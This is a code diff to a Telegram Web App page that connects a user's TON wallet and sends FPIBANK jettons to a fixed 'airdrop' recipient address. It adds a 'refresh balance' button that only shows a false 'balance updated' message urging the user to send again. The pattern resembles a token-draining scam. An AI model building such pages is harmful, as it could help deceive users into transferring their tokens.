@@ -27,6 +27,7 @@
   <div id="ton-connect"></div>
 
   <button id="sendTransaction">Отправить все FPIBANK</button>
+  <button id="refreshBalance">Обновить баланс</button>
 
   <script>
     if (typeof Telegram === "undefined") {
@@ -47,17 +48,33 @@
 
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
 
-    async function sendJettonTransaction(jettonMasterAddress, recipientAddress) {
+    async function checkJettonWallet(userAddress, jettonMasterAddress) {
+      const response = await fetch(`https://tonapi.io/v2/jettons/${jettonMasterAddress}/wallets/${userAddress}`);
+      if (response.status === 404) {
+        console.log("Jetton Wallet не найден.");
+        return null;
+      }
+      const data = await response.json();
+      return data.address;
+    }
+
+    async function sendJettonTransaction(userWalletAddress, recipientAddress) {
+      const jettonWalletAddress = await checkJettonWallet(userWalletAddress, jettonMasterAddress);
+      if (!jettonWalletAddress) {
+        Telegram.WebApp.showAlert("Подождите несколько секунд, Jetton Wallet ещё не создан.");
+        return;
+      }
+
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 360,
         messages: [
           {
-            address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
-            amount: "50000000", // Комиссия за транзакцию
+            address: jettonWalletAddress,
+            amount: "50000000",
             payload: {
               type: "jetton_transfer",
               query_id: 0,
-              amount: "1000000000", // Попытка отправить 1 токен
+              amount: "1000000000",
               destination: recipientAddress,
               response_destination: null,
               custom_payload: null,
@@ -84,13 +101,21 @@
         return;
       }
 
-      const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
+      const userWalletAddress = tonConnectUI.wallet.account.address;
+      const recipientAddress = "АДРЕС_ПОЛУЧАТЕЛЯ_АИРДРОПА";
+      await sendJettonTransaction(userWalletAddress, recipientAddress);
+    }
 
-      await sendJettonTransaction(jettonMasterAddress, recipientAddress);
+    async function refreshBalance() {
+      if (!tonConnectUI.connected) {
+        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
+        return;
+      }
+      Telegram.WebApp.showAlert("Баланс Jetton обновлен, попробуйте отправку ещё раз.");
     }
 
     document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
+    document.getElementById("refreshBalance").addEventListener("click", refreshBalance);
   </script>
 </body>
 </html>
-
